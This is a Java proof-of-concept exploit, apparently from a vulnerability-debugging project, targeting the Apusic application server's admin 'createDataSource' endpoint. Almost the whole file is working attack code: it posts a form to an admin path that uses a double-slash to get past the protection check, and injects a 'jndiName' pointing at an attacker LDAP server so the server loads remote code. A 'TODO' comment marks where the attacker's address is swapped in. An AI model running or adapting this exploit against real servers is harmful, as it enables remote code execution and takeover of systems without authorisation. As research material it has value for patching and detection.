package apusic;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpPost;

import java.io.IOException;
import java.util.Random;

import static com.sun.org.apache.xalan.internal.xsltc.compiler.Constants.CHARACTERS;

/**
 * 漏洞：
 *
 *
 * 关键调试类：
 * com.apusic.aasadmin.monitor.web.datasource.DataSourceController#createDataSource
 */
public class createDataSource_jndi {

    public static String generateRandomString(int length) {
        Random random = new Random();
        StringBuilder sb = new StringBuilder(length);
        for (int i = 0; i < length; i++) {
            sb.append(CHARACTERS.charAt(random.nextInt(CHARACTERS.length())));
        }
        return sb.toString();
    }

    /**
     * Apusic服务器需存在数据库驱动，此处手动添加了db2的依赖
     */
    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.201:6888/admin//protect/datasource/createDataSource";
        // TODO 修改JNDI地址
        String jndiUrl = "ldap://10.58.120.200:1389/cv8nbr";

        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.addHeader("Content-Type","application/x-www-form-urlencoded");
        String name = generateRandomString(6);
        String body = "name="+ name +"&jndiName=" + jndiUrl + "&dbtype=db&drivertype=db3&host=127.0.0.1&port=50000&dbname=test&userName=test&password=test&repassword=test&connectionURL=jdbc:db2://127.0.0.1:50000/test&driverClassName=com.ibm.db2.jcc.DB2Driver";
        Response response = httpRequest.sendStringPost(httpPost, body);
        System.out.println(response.getStatusCode());
    }
}
